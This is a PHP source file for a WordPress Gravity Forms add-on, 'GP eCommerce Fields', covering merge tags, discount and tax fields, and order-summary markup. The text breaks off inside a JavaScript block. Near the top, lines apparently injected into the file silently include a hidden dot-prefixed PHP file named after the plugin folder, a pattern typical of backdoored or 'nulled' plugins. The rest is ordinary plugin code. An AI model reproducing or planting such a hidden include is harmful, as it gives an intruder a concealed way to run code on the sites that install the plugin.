<?php

if ( ! class_exists( 'GP_Plugin' ) ) {
	return;
}

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GP_Ecommerce_Fields extends GP_Plugin {

	public $merge_tags = array();
	public $_order     = false;

	private $_processing_order = false;
	private $_styles           = null;

	private static $_instance = null;

	/**
	 * Defines the version of the GP Limit Submissions Add-On.
	 *
	 * @since 0.9
	 * @access protected
	 * @var string $_version Contains the version.
	 */
	protected $_version = GP_ECOMMERCE_FIELDS_VERSION;
	/**
	 * Defines the plugin slug.
	 *
	 * @since 0.9
	 * @access protected
	 * @var string $_slug The slug used for this plugin.
	 */
	protected $_slug = 'gp-ecommerce-fields';
	/**
	 * Defines the main plugin file.
	 *
	 * @since 0.9
	 * @access protected
	 * @var string $_path The path to the main plugin file, relative to the plugins folder.
	 */
	protected $_path = 'gp-ecommerce-fields/gp-ecommerce-fields.php';
	/**
	 * Defines the full path to this class file.
	 *
	 * @since 0.9
	 * @access protected
	 * @var string $_full_path The full path.
	 */
	protected $_full_path = __FILE__;
	/**
	 * Defines the URL where this add-on can be found.
	 *
	 * @since 0.9
	 * @access protected
	 * @var string
	 */
	protected $_url = 'http://gravitywiz.com/documentation/gravity-forms-ecommerce-fields/';
	/**
	 * Defines the title of this add-on.
	 *
	 * @since 0.9
	 * @access protected
	 * @var string $_title The title of the add-on.
	 */
	protected $_title = 'GP eCommerce Fields';
	/**
	 * Defines the short title of the add-on.
	 *
	 * @since 0.9
	 * @access protected
	 * @var string $_short_title The short title.
	 */
	protected $_short_title = 'eCommerce Fields';

	public static function get_instance() {

		if ( self::$_instance == null ) {
			self::includes();
			self::$_instance = isset( self::$perk_class ) ? new self( new self::$perk_class ) : new self();
		}

		return self::$_instance;

	}

	public function pre_init() {

		parent::pre_init();

		require_once( $this->get_base_path() . '/includes/class-gf-field-subtotal.php' );
		require_once( $this->get_base_path() . '/includes/class-gf-field-tax.php' );
		require_once( $this->get_base_path() . '/includes/class-gf-field-discount.php' );

	}

	public function init() {

		parent::init();

		load_plugin_textdomain( 'gp-ecommerce-fields', false, basename( dirname( __file__ ) ) . '/languages/' );

		$this->merge_tags = array(
			'subtotal'      => array(
				'tag'          => '{subtotal}',
				'label'        => __( 'Subtotal', 'gp-ecommerce-fields' ),
				'isCalculable' => true,
			),
			'coupons'       => array(
				'tag'          => '{coupons}',
				'label'        => __( 'Coupon Total', 'gp-ecommerce-fields' ),
				'isCalculable' => true,
			),
			'discounts'     => array(
				'tag'          => '{discounts}',
				'label'        => __( 'Discounts Total', 'gp-ecommerce-fields' ),
				'isCalculable' => true,
			),
			'order_summary' => array(
				'tag'          => '{order_summary}',
				'label'        => __( 'Order Summary', 'gp-ecommerce-fields' ),
				'isCalculable' => false,
			),
		);

		add_filter( 'gform_admin_pre_render', array( $this, 'register_merge_tags_script' ) );
		add_action( 'gform_field_standard_settings_20', array( $this, 'field_settings_ui' ) );
		add_action( 'gform_editor_js', array( $this, 'field_settings_js' ) );

		add_filter( 'gform_pre_replace_merge_tags', array( $this, 'replace_merge_tags' ), 10, 7 );
		add_filter( 'gform_calculation_formula', array( $this, 'replace_formula_merge_tags' ), 10, 4 );

		add_action( 'gform_product_info', array( $this, 'add_ecommerce_fields_to_order' ), 9, 3 );
		add_filter( 'gform_order_summary', array( $this, 'get_full_order_summary_markup' ), 10, 5 );

		add_filter( 'gform_merge_tag_filter', array( $this, 'remove_field_from_all_fields' ), 10, 5 );
		add_filter( 'gform_merge_tag_filter', array( $this, 'format_merge_tag_currency' ), 10, 5 );
		add_filter( 'gform_field_content', array( $this, 'hide_field_from_entry_detail' ), 10, 5 );
		add_filter( 'gform_entries_field_value', array( $this, 'format_entry_list_field_value' ), 10, 5 );

		add_filter( 'gform_product_field_types', array( $this, 'add_product_field_types' ) );
		add_filter( 'gform_save_field_value', array( $this, 'prevent_negative_totals' ), 10, 4 );

		// Note, GF 2.5+ moves the Add-on init to a priority of 15
		add_action( 'init', array( $this, 'post_init_cleanup' ), 16 );

		// # 3rd Party

		add_filter( 'gform_pre_render', array( $this, 'add_wc_class_to_hide_fields_in_cart_description' ) );

	}

	public function post_init_cleanup() {

		// we're going replace the default coupons anyways; why let them run twice?
		if ( is_callable( 'gf_coupons' ) ) {
			remove_filter( 'gform_product_info', array( gf_coupons(), 'add_discounts' ), 5 );
		}

	}

	public function minimum_requirements() {
		return array(
			'gravityforms' => array(
				'version' => '2.1.3',
			),
			'wordpress'    => array(
				'version' => '4.1',
			),
			'plugins'      => array(
				'gravityperks/gravityperks.php' => array(
					'name'    => 'Gravity Perks',
					'version' => '1.2.18',
				),
			),
		);
	}



	# BACKEND

	public function tooltips( $tooltips ) {

		$template = '<h6>%s</h6> %s';

		$tooltips['tax_amount']         = sprintf( $template, __( 'Tax Amount', 'gp-ecommerce-fields' ), __( 'Specify the percentage amount that should be added to the form total as tax.', 'gp-ecommerce-fields' ) );
		$tooltips['discount_amount']    = sprintf( $template, __( 'Discount Amount', 'gp-ecommerce-fields' ), __( 'Specify the amount that should be discounted from the form total.', 'gp-ecommerce-fields' ) );
		$tooltips['ecommerce_products'] = sprintf( $template, __( 'Applicable Products', 'gp-ecommerce-fields' ), __( 'Specify which Product fields should be included when calculating the value of this field.', 'gp-ecommerce-fields' ) );

		return $tooltips;
	}

	public function field_settings_ui() {
		?>

		<style type="text/css">
			.gpst-child-setting { margin-top: 0; }
			.asmList { margin: 1px 0 0; }
			.asmListItem { margin: 0 0 -1px; padding: 5px 10px !important; border: 1px solid #eee !important; border-radius: 5px; }
			a.asmListItemRemove { display: none; float: right; text-decoration: none; visibility: hidden; }
			a.asmListItemRemove:after { content: '\f057'; font-family: 'FontAwesome'; visibility: visible; }
			.asmListItem:hover a.asmListItemRemove { display: inline-block; }
			.inline-select-label { vertical-align: middle; }
		</style>

		<li class="ecommerce-amount-setting field_setting" >

			<label for="ecommerce-amount" class="section_label">
				<span class="tax-label ecommerce-label">
					<?php _e( 'Tax Amount', 'gp-ecommerce-fields' ); ?>
					<?php gform_tooltip( 'tax_amount' ); ?>
				</span>
				<span class="discount-label ecommerce-label">
					<?php _e( 'Discount Amount', 'gp-ecommerce-fields' ); ?>
					<?php gform_tooltip( 'discount_amount' ); ?>
				</span>
			</label>
			<input type="text" id="ecommerce-amount" size="10" onblur="GPSFormEditor.parseAmount( this.value, this );" />
			<span class="inline-label discount-label ecommerce-label" style="opacity:0.5;">
				<?php
				// Translators: The %s is replaced with "$10" customized to the user's configured currency.
				printf( __( 'Supports 10&#37; or %s', 'gp-ecommerce-fields' ), GFCommon::to_money( '10' ) );
				?>
			</span>

		</li>

		<li class="ecommerce-products-setting field_setting" >

			<label for="ecommerce-products-type" class="section_label">
				<?php _e( 'Applicable Products', 'gp-ecommerce-fields' ); ?>
				<?php gform_tooltip( 'ecommerce_products' ); ?>
			</label>

			<span class="subtotal-label ecommerce-label inline-select-label">
				<?php _e( 'Include', 'gp-ecommerce-fields' ); ?>
			</span>
			<span class="tax-label ecommerce-label inline-select-label">
				<?php _e( 'Apply tax to', 'gp-ecommerce-fields' ); ?>
			</span>
			<span class="discount-label ecommerce-label inline-select-label">
				<?php _e( 'Apply discount to', 'gp-ecommerce-fields' ); ?>
			</span>
			<select id="ecommerce-products-type" onchange="GPSFormEditor.toggleProductsType( this.value, this );">
				<option value="all"><?php _e( 'all products', 'gp-ecommerce-fields' ); ?></option>
				<option value="include"><?php _e( 'specific products', 'gp-ecommerce-fields' ); ?></option>
				<option value="exclude"><?php _e( 'all products with exceptions' ); ?></option>
			</select>

			<div id="ecommerce-products-settings" class="perk-settings-container gpst-child-setting" style="display:none;">
				<select id="ecommerce-products" multiple="multiple" title="<?php _e( 'Select Products', 'gp-ecommerce-fields' ); ?>">
					<option value=""><?php _e( 'Select Products', 'gp-ecommerce-fields' ); ?></option>
				</select>
			</div>

		</li>

		<?php
	}

	public function field_settings_js() {
		?>

		<script type="text/javascript">

			var GPSFormEditor;

			( function( $ ) {

				GPSFormEditor = {

					parseAmount: function( amount, elem, amountType ) {

						if( typeof amount != 'string' ) {
							amount = String( amount );
						}

						var type            = GetSelectedField().type,
							amountType      = typeof amountType == 'undefined' ? 'flat' : amountType,
							isPercentage    = type == 'tax' || amount.indexOf( '%' ) != -1 || amountType == 'percent',
							amount          = Math.abs( gformToNumber( amount ) ),
							parsedAmount    = amount != false ? amount : 0,
							parsedAmount    = isPercentage ? Math.min( amount, 100 ) : amount;
							formattedAmount = isPercentage ? gformFormatNumber( parsedAmount, -1 ) + '%' : gformFormatMoney( parsedAmount, true ),
							$input          = $( elem );

						// save "clean" number
						SetFieldProperty( type + 'Amount', parsedAmount );
						SetFieldProperty( type + 'AmountType', isPercentage ? 'percent' : 'flat' );

						// display formatted number based on default currency
						$input.val( formattedAmount );

					},

					toggleProductsType: function( value, elem, isInit ) {

						var type             = GetSelectedField().type,
							$productsType    = $( elem ),
							value            = ! value ? 'all' : value,
							$childSettings   = $( '#ecommerce-products-settings' ),
							isApplicableType = $.inArray( value, [ 'include', 'exclude' ] ) != -1,
							isInit           = typeof isInit != 'undefined' ? isInit : false;

						SetFieldProperty( type + 'ProductsType', value );

						$productsType.val( value );

						if( ! isInit ) {
							var $products = $( '#ecommerce-products' );
							$products.val( false ).change();
						}

						if( isApplicableType ) {
							$childSettings.slideDown();
						} else {
							$childSettings.slideUp();
						}

					},

					populateProducts: function( form, products ) {

						var fields    = GPSFormEditor.getProductFields( form ),
							markup    = '',
							$products = $( '#ecommerce-products' ),
							products  = products ? products : [];

						for( var i = 0; i < fields.length; i++ ) {
							var selected = $.inArray( String( fields[ i ].id ), products ) != -1 ? 'selected="selected"' : '';
							markup += '<option value="' + fields[ i ].id + '" ' + selected + '>' + GetLabel( fields[ i ] ) + '</option>'
						}

						$products.html( markup ).change();

						if( ! $products.data( 'asmApplied' ) ) {
							$products.asmSelect().data( 'asmApplied', true );
						}


					},

					getProductFields: function( form ) {

						var productFields = [];

						for( var i = 0; i < form.fields.length; i++ ) {
							if( form.fields[ i ].type == 'product' ) {
								productFields.push( form.fields[ i ] );
							}
						}

						return productFields;
					},

					setProducts: function( products ) {
						var type = GetSelectedField().type;
						SetFieldProperty( type + 'Products', products );
					},

					toggleLabels: function( type ) {

						$( '.ecommerce-label' ).hide();
						$( '.{0}-label'.format( type ) ).show();

					}

				};

				$( document ).bind( 'gform_load_field_settings', function( event, field, form ) {

					if( $.inArray( field.type, [ 'tax', 'discount', 'subtotal' ] ) != -1 ) {

						GPSFormEditor.parseAmount( field[ field.type + 'Amount' ], $( '#ecommerce-amount' ), field[ field.type + 'AmountType' ] );
						GPSFormEditor.toggleProductsType( field[ field.type + 'ProductsType' ], $( '#ecommerce-products-type' ), true );
						GPSFormEditor.populateProducts( form, field[ field.type + 'Products' ] );
						GPSFormEditor.toggleLabels( field.type );

						// administrative should not be a visibility option for ecommerce fields
						$( '#field_visibility_administrative, label[for="field_visibility_administrative"]' ).attr( 'style', 'display: none !important;' );

					} else {

						// administrative should not be a visibility option for ecommerce fields
						$( '#field_visibility_administrative, label[for="field_visibility_administrative"]' ).attr( 'style', '' );

					}

				} );

				$( document ).ready( function() {

					$( '#ecommerce-products' ).change( function() {
						GPSFormEditor.setProducts( $( this ).val() );
					} );

				} );

			} )( jQuery );

		</script>

		<?php
	}



	# FRONTEND

	public function scripts() {

		$min = ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) || isset( $_GET['gform_debug'] ) ? '' : '.min';

		$scripts = array();

		$deps = array( 'jquery', 'gform_conditional_logic' );
		if ( class_exists( 'GF_Coupon' ) && $this->has_field_types( $this->get_current_form(), 'coupon' ) ) {
			$deps[] = 'gform_coupon_script';
		}

		$scripts[] = array(
			'handle'  => 'gp-ecommerce-fields',
			'src'     => $this->get_base_url() . "/js/gp-ecommerce-fields{$min}.js",
			'version' => $this->_version,
			'deps'    => $deps,
			'enqueue' => array(
				array( $this, 'should_enqueue_frontend_script' ),
			),
		);

		$scripts[] = array(
			'handle'  => 'asm-select',
			'src'     => $this->get_base_url() . "/js/jquery.asmselect{$min}.js",
			'version' => $this->_version,
			'deps'    => array( 'jquery' ),
			'enqueue' => array(
				array( 'admin_page' => array( 'form_editor' ) ),
			),
		);

		return array_merge( parent::scripts(), $scripts );
	}

	public function should_enqueue_frontend_script( $form ) {
		return ! GFForms::get_page() && ( $this->has_ecommerce_field( $form ) || $this->has_ecommerce_merge_tag( $form ) );
	}



	# SUBMISSION

	public function add_ecommerce_fields_to_order( $order, $form, $entry ) {

		if ( $this->_processing_order ) {
			return $order;
		}

		$this->_processing_order = true;
		$this->_order            = $order;

		$shipping                 = $this->_order['shipping'];
		$this->_order['shipping'] = array(
			'name'  => '',
			'price' => 0,
		);

		if ( $this->has_field_types( $form, 'discount' ) && is_callable( 'GF_Field_Discount', 'add_discounts' ) ) {
			$this->_order = GF_Field_Discount::add_discounts( $this->_order, $form, $entry );
		}

		$this->_order = $this->update_order_coupons( $this->_order, $form, $entry );

		// must happen AFTER coupons have been added to $this->_order
		$this->_order = $this->reprocess_calculations( $this->_order, $form, $entry );

		$this->_order['shipping'] = $shipping;

		if ( $this->has_field_types( $form, 'tax' ) && is_callable( 'GF_Field_Tax', 'add_taxes' ) ) {
			$this->_order = GF_Field_Tax::add_taxes( $this->_order, $form, $entry );
		}

		$this->_processing_order = false;

		return $this->_order;
	}

	public function get_order_summary( $order, $form, $entry ) {

		$order_summary = $this->get_default_order_summary_items( $order, $form, $entry );

		// add subtotal to any $order with more than just a total
		if ( $this->has_shipping( $order ) || $this->has_ecommerce_field( $form ) || $this->has_line_item_type( $order, 'discount' ) || $this->has_line_item_type( $order, 'tax' ) ) {
			$order_summary = GF_Field_Subtotal::add_order_summary_subtotal_items( $order_summary, $form, $entry, $order );
		}

		if ( $this->has_field_types( $form, 'discount' ) || $this->has_line_item_type( $order, 'discount' ) ) {
			$order_summary = GF_Field_Discount::add_order_summary_discount_items( $order_summary, $form, $entry, $order );
		}

		if ( $this->has_field_types( $form, 'tax' ) || $this->has_line_item_type( $order, 'tax' ) ) {
			$order_summary = GF_Field_Tax::add_order_summary_tax_items( $order_summary, $form, $entry, $order );
		}

		/**
		 * Filter the order summary.
		 *
		 * @since 1.0.15
		 *
		 * @param array $order_summary An array of order item groups (subtotal, discounts, coupons, shipping, taxes, total).
		 * @param array $form          The current form object.
		 * @param array $entry         The current entry object.
		 */
		$order_summary = gf_apply_filters( array( 'gpecf_order_summary', $form['id'] ), $order_summary, $form, $entry );

		$order_summary = array_values( array_filter( $order_summary ) );

		return $order_summary;
	}

	public function get_order_summary_markup( $order, $form, $entry, $order_summary = false, $labels = false, $is_inline = null, $modifiers = array() ) {

		if ( $is_inline === null ) {
			$is_inline = ! GFCommon::is_entry_detail();
			// cache the styles in inline mode so all calls to the style() method for this page load will return inline styles
			$this->get_styles( $is_inline );
		}

		if ( ! $order_summary ) {
			$order_summary = $this->get_order_summary( $order, $form, $entry );
		}

		if ( ! $labels ) {
			$labels = $this->get_order_labels( $form['id'] );
		}

		ob_start();
		?>

		<table class="gpecf-order-summary" cellspacing="0" width="100%" style="<?php $this->style( '.order-summary' ); ?>">
			<thead>
				<tr>
					<th scope="col" style="<?php $this->style( '.order-summary/thead/th.column-1' ); ?>"><?php echo $labels['product']; ?></th>
					<th scope="col" style="<?php $this->style( '.order-summary/thead/th.column-2' ); ?>"><?php echo $labels['quantity']; ?></th>
					<th scope="col" style="<?php $this->style( '.order-summary/thead/th.column-3' ); ?>"><?php echo $labels['unit_price']; ?></th>
					<th scope="col" style="<?php $this->style( '.order-summary/thead/th.column-4' ); ?>"><?php echo $labels['price']; ?></th>
				</tr>
			</thead>
			<tbody>
			<?php
			foreach ( $order['products'] as $product ) :
				if ( empty( $product['name'] ) || $this->is_ecommerce_product( $product ) ) {
					continue;
				}
				?>
				<tr style="<?php $this->style( '.order-summary/tbody/tr' ); ?>">
					<td style="<?php $this->style( '.order-summary/tbody/tr/td.column-1' ); ?>">
						<div style="<?php $this->style( '.order-summary/.product-name' ); ?>">
							<?php echo esc_html( $product['name'] ); ?>
						</div>
						<ul style="<?php $this->style( '.order-summary/.product-options' ); ?>">
							<?php
							$price = GFCommon::to_number( $product['price'] );
							if ( is_array( rgar( $product, 'options' ) ) ) :
								foreach ( $product['options'] as $index => $option ) :
									$price += GFCommon::to_number( $option['price'] );
									$class  = $index == count( $product['options'] ) - 1 ? '.last-child' : '';
									?>
									<li style="<?php $this->style( ".order-summary/.product-options/li{$class}" ); ?>"><?php echo $option['option_label']; ?></li>
									<?php
								endforeach;
							endif;
							$field_total = floatval( $product['quantity'] ) * $price;
							?>
						</ul>
					</td>
					<td style="<?php $this->style( '.order-summary/tbody/tr/td.column-2' ); ?>"><?php echo esc_html( $product['quantity'] ); ?></td>
					<td style="<?php $this->style( '.order-summary/tbody/tr/td.column-3' ); ?>"><?php echo GFCommon::to_money( $price, $entry['currency'] ); ?></td>
					<td style="<?php $this->style( '.order-summary/tbody/tr/td.column-4' ); ?>"><?php echo GFCommon::to_money( $field_total, $entry['currency'] ); ?></td>
				</tr>
				<?php
			endforeach;
			?>
			</tbody>
			<tfoot style="<?php $this->style( '.order-summary/tfoot' ); ?>">
			<?php foreach ( $this->get_order_summary( $order, $form, $entry ) as $index => $group ) : ?>
				<?php
				foreach ( $group as $item ) :
					$class = rgar( $item, 'class' ) ? '.' . rgar( $item, 'class' ) : '';
					?>
					<tr style="<?php $this->style( '.order-summary/tfoot/tr' . $class ); ?>">
						<?php if ( $index === 0 ) : ?>
							<td style="<?php $this->style( '.order-summary/tfoot/tr/td.empty' ); ?>" colspan="2" rowspan="<?php echo $this->get_order_summary_item_count( $order_summary ); ?>"></td>
						<?php endif; ?>
						<td style="<?php $this->style( ".order-summary/tfoot/{$class}/td.column-3" ); ?>"><?php echo $item['name']; ?></td>
						<td style="<?php $this->style( ".order-summary/tfoot/{$class}/td.column-4" ); ?>"><?php echo GFCommon::to_money( $item['price'], $entry['currency'] ); ?></td>
					</tr>
				<?php endforeach; ?>
			<?php endforeach; ?>
			</tfoot>
		</table>

		<?php

		$markup = ob_get_clean();

		/**
		 * Filter the order summary markup.
		 *
		 * @since 1.0.38
		 *
		 * @param string $markup        The generated order summary markup.
		 * @param array  $order         The order data.
		 * @param array  $form          The current form.
		 * @param array  $entry         The current entry.
		 * @param array  $order_summary The data used to render a summary of the order.
		 * @param array  $labels        The labels used to identify elements in the order summary (e.g. Subtotal, Total, Quantity).
		 * @param array  $is_inline     Indicate whether the styles should include font styling for emails.
		 */
		return gf_apply_filters( array( 'gpecf_order_sumary_markup', $form['id'] ), $markup, $order, $form, $entry, $order_summary, $labels, $is_inline, $modifiers );
	}

	public function get_full_order_summary_markup( $markup, $form, $entry, $order, $format ) {

		/**
		 * Optionally disable the GPECF order summary (which will replace the default GF order summary).
		 *
		 * @since 1.0
		 *
		 * @param bool  $enabled Whether or not the GPECF order summary is enabled. Defaults to true.
		 * @param array $form    The current form object for which the order summary is being generated.
		 * @param array $entry   The current entry object for which the order summary is being generated.
		 * @param array $order   The current Order object for which the order summary is being generated.
		 * @param array $format  The format in which the order summmary should be generated. Options are "text" and "html". Defaults to "html".
		 */
		$apply_custom_order_summary = gf_apply_filters( array( 'gpecf_apply_custom_order_summary', $form['id'] ), true, $form, $entry, $order, $format );
		if ( ! $apply_custom_order_summary ) {
			return $markup;
		}

		if ( $format === 'text' ) {
			$markup = $this->get_order_summary_markup_text( $order, $form, $entry );
		} else {
			$markup = $this->get_full_order_summary_markup_html( $order, $form, $entry );
		}

		return $markup;
	}

	public function get_full_order_summary_markup_html( $order, $form, $entry, $is_inline = null ) {

		if ( $is_inline === null ) {
			$is_inline = ! GFCommon::is_entry_detail();
		}

		$order_summary = $this->get_order_summary( $order, $form, $entry );
		$labels        = $this->get_order_labels( $form['id'] );

		// Check if the form has any section fields and match their style on the order-summary label
		// Otherwise, match the style of a standard GF field
		$form_has_sections = false;
		foreach ( $form['fields'] as $field ) {
			if ( $field->type === 'section' ) {
				$form_has_sections = true;
				break;
			}
		}
		$tr_order_label_style = ( $form_has_sections ) ? false : 'tr.order-label';
		$td_order_label_style = ( $form_has_sections ) ? 'td.order-label' : false;
		ob_start();

		?>

		<tr style="<?php $this->style( $tr_order_label_style ); ?>">
			<td style="<?php $this->style( $td_order_label_style ); ?>" colspan="2" class="entry-view-field-name" ><?php echo $labels['order']; ?></td>
		</tr>
		<tr class="lastrow">
			<td class="" colspan="2">
				<?php echo $this->get_order_summary_markup( $order, $form, $entry, $order_summary, $labels, $is_inline ); ?>
			</td>
		</tr>

		<?php
		return ob_get_clean();
	}

	public function style( $path ) {

		if ( ! $path ) {
			return;
		}

		$working_path = explode( '/', $path );
		$target       = empty( $working_path ) ? $path : array_pop( $working_path );
		$styles       = array();

		preg_match_all( '/(\w+)|([\.#+][\w\-_]+)/', $target, $matches );
		$targets = $matches[0];

		// include our "full" target as well (i.e. [ 'li.last-child', 'li', '.last-child' ] )
		if ( count( $targets ) > 1 ) {
			$targets[] = $target;
		}

		foreach ( array_reverse( $targets ) as $target ) {

			$working_path = explode( '/', $path );
			array_pop( $working_path );

			if ( empty( $working_path ) ) {
				$styles = array_merge( $styles, rgars( $this->get_styles(), $path, array() ) );
			} else {
				while ( count( $working_path ) > 0 ) {

					$_path       = sprintf( '%s/%s', implode( '/', $working_path ), $target );
					$path_styles = rgars( $this->get_styles(), $_path, array() );
					$styles      = array_merge( $path_styles, $styles );

					array_pop( $working_path );

				}
			}
		}

		$style = '';

		foreach ( $styles as $prop => $value ) {
			if ( ! is_array( $value ) ) {
				$style .= sprintf( '%s: %s; ', $prop, $value );
			}
		}

		echo $style;

	}

	public function get_styles( $is_inline = false ) {

		if ( $this->_styles === null ) {

			$this->_styles = array(
				'.order-summary'         => array(
					'margin'           => 0,
					'border'           => '1px solid #dfdfdf',
					'border-right'     => 'none',
					'th'               => array(
						'border-right' => '1px solid #dfdfdf',
						'text-align'   => 'left',
						'padding'      => '8px 10px',
						'font-weight'  => 'normal',
						'font-size'    => '14px',
					),
					'td'               => array(
						'border-right'   => '1px solid #dfdfdf',
						'vertical-align' => 'top',
						'padding'        => '8px 10px',
					),
					'thead'            => array(
						'th' => array(
							'background-color' => '#f4f4f4',
						),
					),
					'tfoot'            => array(
						'td'        => array(
							'font-size'      => '13px',
							'vertical-align' => 'middle',
							'border-top'     => '1px solid #dfdfdf',
						),
						'.subtotal' => array(
							'td' => array(
								'font-weight'      => 'bold',
								'background-color' => '#f4f4f4',
							),
						),
						'.discount' => array(
							'td' => array(
								'color' => '#080',
							),
						),
						'.tax'      => array(),
						'.total'    => array(
							'td' => array(
								'font-weight'      => 'bold',
								'background-color' => '#EAF2FA',
							),
						),
						'.empty'    => array(
							'background-color' => '#f4f4f4',
							'background'       => 'repeating-linear-gradient(
                                45deg,
                                #f4f4f4,
                                #f4f4f4 3px,
                                #fafafa 3px,
                                #fafafa 6px
                            )',
						),
					),
					'.column-1'        => array(
						'width' => '50%',
					),
					'.column-2'        => array(
						'text-align' => 'center',
					),
					'.column-3'        => array(
						'text-align' => 'right',
					),
					'.column-4'        => array(
						'text-align' => 'right',
					),
					'.product-name'    => array(
						'font-weight'   => 'bold',
						'color'         => '#bf461e',
						'font-size'     => '13px',
						'margin-bottom' => '5px',
					),
					'.product-options' => array(
						'padding-left'  => 0,
						'margin'        => 0,
						'li'            => array(
							'background-image'    => sprintf( 'url( %s/images/prodlist.png )', GFCommon::get_base_url() ),
							'background-position' => '0 0',
							'background-repeat'   => 'no-repeat',
							'overflow'            => 'hidden',
							'margin'              => '0 0 0 2px !important',
							'padding'             => '2px 0 6px 16px',
							'color'               => '#555',
							'line-height'         => '1.5',
						),
						'li.last-child' => array(
							'background-image' => sprintf( 'url( %s/images/prodlist-last.png )', GFCommon::get_base_url() ),
						),
					),
				),
				'tr.order-label'         => array(
					'font-family'      => 'sans-serif',
					'font-size'        => '12px',
					'background-color' => '#EAF2FA',
					'font-weight'      => 'bold',
				),
				'td.order-label' => array(
					'font-size'        => '14px',
					'font-weight'      => 'bold',
					'background-color' => '#EEE',
					'border-bottom'    => '1px solid #DFDFDF',
					'padding'          => '7px 7px',
				),
			);

			if ( $is_inline ) {
				$this->_styles = array_merge_recursive(
					array(
						'.order-summary' => array(
							'th' => array(
								'font-family' => 'sans-serif',
							),
							'td' => array(
								'font-family' => 'sans-serif',
								'font-size'   => '12px',
							),
						),
					),
					$this->_styles
				);
			}

			/**
			 * Filter inline styles which will be applied to the order summary.
			 *
			 * @since 1.0
			 *
			 * @param array $styles An array of styles in array( selector => array( property => value ) ) format.
			 */
			$this->_styles = apply_filters( 'gpecf_styles', $this->_styles );

		}

		return $this->_styles;
	}

	public function get_order_summary_markup_text( $order, $form, $entry ) {

		$order_summary = $this->get_order_summary( $order, $form, $entry );
		$labels        = $this->get_order_labels( $form['id'] );
		$markup        = array();
		$hr            = '--------------------------------';

		$markup[] = sprintf( "%s\n%s\n%s", $hr, $labels['order'], $hr );

		foreach ( $order['products'] as $product ) {

			if ( $this->is_ecommerce_product( $product ) ) {
				continue;
			}

			$markup[] = $this->get_order_summary_markup_item_text( $product, $entry );

		}

		foreach ( $order_summary as $group ) {
			foreach ( $group as $item ) {

				$item_markup = '';
				$class       = rgar( $item, 'class' );

				if ( $class === 'subtotal' ) {
					$item_markup .= "$hr\n\n";
				} elseif ( $class === 'total' ) {
					$item_markup .= "$hr\n";
				}

				$item_markup .= $this->get_order_summary_markup_item_text( $item, $entry );

				if ( $class === 'total' ) {
					$item_markup .= "\n$hr";
				}

				$markup[] = $item_markup;

			}
		}

		return implode( "\n\n", $markup );
	}

	public function get_order_summary_markup_item_text( $product, $entry ) {

		$product_name = ( isset( $product['quantity'] ) ? $product['quantity'] . ' ' : '' ) . $product['name'];
		$price        = GFCommon::to_number( $product['price'], $entry['currency'] );

		if ( ! empty( $product['options'] ) ) {
			$options = array();
			foreach ( $product['options'] as $option ) {
				$price    += GFCommon::to_number( $option['price'], $entry['currency'] );
				$options[] = $option['option_name'];
			}
			$product_name .= sprintf( '(%s)', implode( ', ', $options ) );
		}

		$subtotal = floatval( rgar( $product, 'quantity', 1 ) ) * $price;
		$markup   = "{$product_name}: " . GFCommon::to_money( $subtotal, $entry['currency'] );

		return $markup;
	}

	public function get_order_labels( $form_id ) {
		/**
		 * Filter the labels used in the order summary.
		 *
		 * @param array $labels {
		 *
		 *     @var string $order      The label of the order summary which display in the Entry Detail view and in the {all_fields} output.
		 *     @var string $product    The label of the order summary's Product column.
		 *     @var string $quantity   The label of the order summary's Quantity column.
		 *     @var string $unit_price The label of the order summary's Unit Price column.
		 *     @var string $price      The label of the order summary's Price column.
		 *     @var string $subtotal   The label of the order summary's Subtotal row.
		 *     @var string $total      The label of the order summary's Total row.
		 * }
		 *
		 * @since 1.0
		 */
		return gf_apply_filters(
			array( 'gpecf_order_labels', $form_id ),
			array(
				'order'      => esc_html( gf_apply_filters( array( 'gform_order_label', $form_id ), __( 'Order', 'gp-ecommerce-fields' ), $form_id ) ),
				'product'    => esc_html( gf_apply_filters( array( 'gform_product', $form_id ), __( 'Product', 'gp-ecommerce-fields' ), $form_id ) ),
				'quantity'   => esc_html( gf_apply_filters( array( 'gform_product_qty', $form_id ), __( 'Qty', 'gp-ecommerce-fields' ), $form_id ) ),
				'unit_price' => esc_html( gf_apply_filters( array( 'gform_product_unitprice', $form_id ), __( 'Unit Price', 'gp-ecommerce-fields' ), $form_id ) ),
				'price'      => esc_html( gf_apply_filters( array( 'gform_product_price', $form_id ), __( 'Price', 'gp-ecommerce-fields' ), $form_id ) ),
				'subtotal'   => esc_html__( 'Subtotal', 'gp-ecommerce-fields' ),
				'total'      => esc_html__( 'Total', 'gp-ecommerce-fields' ),
			),
			$form_id
		);
	}

	public function get_default_order_summary_ordering() {
		return array( 'subtotal', 'discounts', 'coupons', 'shipping', 'taxes', 'total' );
	}

	public function get_default_order_summary_items( $order, $form, $entry ) {

		$items = array_fill_keys( $this->get_default_order_summary_ordering(), array() );

		if ( $this->has_shipping( $order ) ) {
			$shipping            = $order['shipping'];
			$shipping['class']   = 'shipping';
			$items['shipping'][] = $shipping;
		}

		foreach ( $order['products'] as $key => $product ) {
			if ( $this->is_valid_coupon( $key, $form, $entry ) ) {
				$items['coupons'][] = array(
					'name'      => sprintf(
						'
						<span style="display:block;">%s</span>
						<span style="font-weight:normal;opacity:0.5;font-family:monospace;text-transform:uppercase;color: #666;">(%s)</span>',
						$product['name'],
						$this->parse_coupon_code_from_key( $key )
					),
					'price'     => $product['price'],
					'cellStyle' => 'color:#008800;vertical-align:middle;',
					'class'     => 'discount coupon',
				);
			}
		}

		$labels           = $this->get_order_labels( $form['id'] );
		$items['total'][] = array(
			'name'      => $labels['total'],
			'price'     => $this->get_total( $order ),
			'cellStyle' => 'background-color: #EAF2FA',
			'class'     => 'total',
		);

		return $items;
	}

	public function get_order_summary_item_count( $order_summary ) {

		$count = 0;

		foreach ( $order_summary as $group ) {
			$count += count( $group );
		}

		return $count;
	}

	public function register_merge_tags_script( $form ) {

		if ( ! did_action( 'admin_head' ) ) {
			add_action( 'admin_head', array( $this, 'add_merge_tags' ) );
		} else {
			add_action( 'admin_footer', array( $this, 'add_merge_tags_footer' ) );
		}

		return $form;
	}

	public function add_merge_tags() {
		?>

		<script type="text/javascript">

			// for the future (not yet supported for calc field)
			if( window.gform ) {
				gform.addFilter( 'gform_merge_tags', function( mergeTags, elementId, hideAllFields, excludeFieldTypes, isPrepop, option ) {
